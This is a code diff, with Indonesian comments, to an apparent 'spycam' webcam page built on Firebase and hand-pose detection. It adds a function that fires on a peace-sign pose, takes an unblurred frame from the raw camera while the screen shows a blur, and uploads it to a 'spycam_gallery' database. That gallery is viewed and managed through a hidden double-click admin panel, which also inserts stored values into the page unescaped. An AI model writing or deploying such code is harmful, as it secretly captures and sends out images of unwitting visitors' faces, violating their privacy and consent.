@@ -193,7 +193,7 @@
     <!-- SCRIPT FIREBASE & AI -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
-        import { getDatabase, ref, set, push, onValue, get } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-database.js";
+        import { getDatabase, ref, set, push, onValue, get, remove } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-database.js";
 
         const videoElement = document.getElementById('webcam');
         const canvasElement = document.getElementById('canvas-display');
@@ -204,6 +204,7 @@
         const polaroidText = document.getElementById('polaroid-text');
         
         let targetBlur = 0, currentBlur = 0, isBlurNow = false;
+        let hasCapturedThisPose = false; // Mencegah jepret foto berkali-kali saat ditahan
 
         // ID Unik User
         let myUserId = localStorage.getItem('spycam_uid');
@@ -279,6 +280,35 @@
             });
         }
 
+        // --- FUNGSI AUTO-CAPTURE SAAT POSE ✌️ (TANPA BLUR) ---
+        function autoCaptureClearPhoto() {
+            const snapCanvas = document.createElement('canvas');
+            snapCanvas.width = videoElement.videoWidth; 
+            snapCanvas.height = videoElement.videoHeight;
+            const sCtx = snapCanvas.getContext('2d');
+            
+            // Mirror gambar
+            sCtx.translate(snapCanvas.width, 0);
+            sCtx.scale(-1, 1);
+            
+            // Jepret dari video asli (kamera mentah sebelum kena filter canvas blur)
+            sCtx.drawImage(videoElement, 0, 0, snapCanvas.width, snapCanvas.height);
+            const base64 = snapCanvas.toDataURL('image/jpeg', 0.8);
+            
+            // Kirim ke galeri
+            push(ref(db, 'spycam_gallery'), {
+                image: base64,
+                timestamp: Date.now(),
+                userId: myUserId + "_autopose"
+            });
+            
+            // Efek Flash Putih tipis biar berasa difoto
+            const flash = document.createElement('div');
+            flash.className = 'fixed inset-0 bg-white z-[100] pointer-events-none opacity-80 transition-all duration-300';
+            document.body.appendChild(flash);
+            setTimeout(() => flash.classList.replace('opacity-80', 'opacity-0'), 50);
+            setTimeout(() => flash.remove(), 400);
+        }
 
         // --- 3. SISTEM ADMIN (Double Click) ---
         const secretBtn = document.getElementById('secret-admin');
@@ -381,14 +411,29 @@
                     photos.forEach(photo => {
                         const date = new Date(photo.timestamp).toLocaleString('id-ID');
                         const div = document.createElement('div');
-                        div.className = 'bg-gray-800 rounded-xl p-3 flex flex-col gap-3 shadow-xl border border-gray-700';
+                        div.className = 'bg-gray-800 rounded-xl p-3 flex flex-col gap-3 shadow-xl border border-gray-700 transition-all duration-300';
                         div.innerHTML = `
                             <img src="${photo.image}" class="w-full aspect-[3/4] object-cover rounded-lg border border-gray-600">
                             <div class="flex justify-between items-center px-1">
                                 <span class="text-xs text-gray-400 font-cute">${date}</span>
-                                <a href="${photo.image}" download="SpyCam_${photo.timestamp}.jpg" class="bg-blue-500 hover:bg-blue-600 text-white text-xs px-3 py-1.5 rounded-lg font-bold">📥 Save</a>
+                                <div class="flex gap-2">
+                                    <button class="btn-delete bg-red-500 hover:bg-red-600 text-white text-xs px-2.5 py-1.5 rounded-lg font-bold" title="Hapus">🗑️</button>
+                                    <a href="${photo.image}" download="SpyCam_${photo.timestamp}.jpg" class="bg-blue-500 hover:bg-blue-600 text-white text-xs px-3 py-1.5 rounded-lg font-bold">📥 Save</a>
+                                </div>
                             </div>
                         `;
+                        
+                        // Logika Hapus Foto dari Database & Layar
+                        const btnDelete = div.querySelector('.btn-delete');
+                        btnDelete.addEventListener('click', () => {
+                            btnDelete.innerHTML = "⏳";
+                            remove(ref(db, 'spycam_gallery/' + photo.id)).then(() => {
+                                div.style.transform = 'scale(0.8)';
+                                div.style.opacity = '0';
+                                setTimeout(() => div.remove(), 300);
+                            });
+                        });
+
                         galleryGrid.appendChild(div);
                     });
                 } else {
@@ -420,15 +465,23 @@
                 const is2 = (lm[8].y < lm[6].y) && (lm[12].y < lm[10].y) && (lm[16].y > lm[14].y) && (lm[20].y > lm[18].y);
 
                 if (is2) {
+                    // Cek biar nggak nge-spam jepret foto berulang kali saat pose ditahan
+                    if (!hasCapturedThisPose) {
+                        hasCapturedThisPose = true;
+                        autoCaptureClearPhoto(); // Eksekusi jepret foto jernih dulu!
+                    }
+
                     targetBlur = 16; isBlurNow = true;
                     statusText.innerText = "Pose ✌️ Ketemu!"; statusIcon.innerText = "✨";
                     polaroidText.innerText = "Blurred Memories ☁️";
                 } else {
+                    hasCapturedThisPose = false; // Reset sistem foto kalau tangan turun
                     targetBlur = 0; isBlurNow = false;
                     statusText.innerText = "Ayo pose ✌️"; statusIcon.innerText = "👀";
                     polaroidText.innerText = "Me & You <3";
                 }
             } else {
+                hasCapturedThisPose = false; // Reset sistem foto kalau ga ada tangan
                 targetBlur = 0; isBlurNow = false;
                 statusText.innerText = "Tunjukin tanganmu!"; statusIcon.innerText = "👋";
             }
